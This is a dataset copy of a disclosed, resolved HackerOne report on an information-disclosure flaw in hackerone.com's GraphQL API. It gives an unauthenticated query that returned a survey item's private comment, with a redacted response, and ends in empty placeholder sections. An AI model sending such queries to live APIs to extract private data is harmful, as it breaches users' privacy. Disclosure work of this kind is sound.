---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '978143'
original_report_id: '978143'
title: Team object in GraphQL disclosed private_comment
weakness: Information Disclosure
team_handle: security
created_at: '2020-09-10T04:48:00.513Z'
disclosed_at: '2020-09-10T19:05:03.223Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 141
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Team object in GraphQL disclosed private_comment

## Metadata

- HackerOne Report ID: 978143
- Weakness: Information Disclosure
- Program: security
- Disclosed At: 2020-09-10T19:05:03.223Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Hi Team, Some private(I think) part of GraphQL reveals to us

### Steps To Reproduce
Without authorization

1. https://hackerone.com/graphql 

POST:

`{"query":"query { node(id: \\"gid://hackerone/SurveyRatingItem/█████\\") { ... on SurveyRatingItem{_id,pentester{_id},team{_id},key,private_comment,public_comment,rating,recipient{username,email},subject{... on Report{_id}},survey_rating{_id,team{_id},state,respondent{_id,username,email,pentests{nodes{_id}}}}}}}","variables":{}}`

`{"data":{"node":{"_id":"████████","pentester":null,"team":null,"key":"scope","private_comment":"████","public_comment":null,"rating":1,"recipient":null,"subject":null,"survey_rating":{"_id":"█████","team":null,"state":"completed","respondent":{"_id":"████","username":"███","email":null,"pentests":{"nodes":[]}}}}}}`

As we can see, the `key` field takes the value `scope`, we don't see in which program this happens, but we can see the comments of the participant, and as we can see, it has the status private

PS. Yes, we do not see some data, but in the future they may be disclosed in the comments (I think so)

## Impact

disclosed private_comment

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
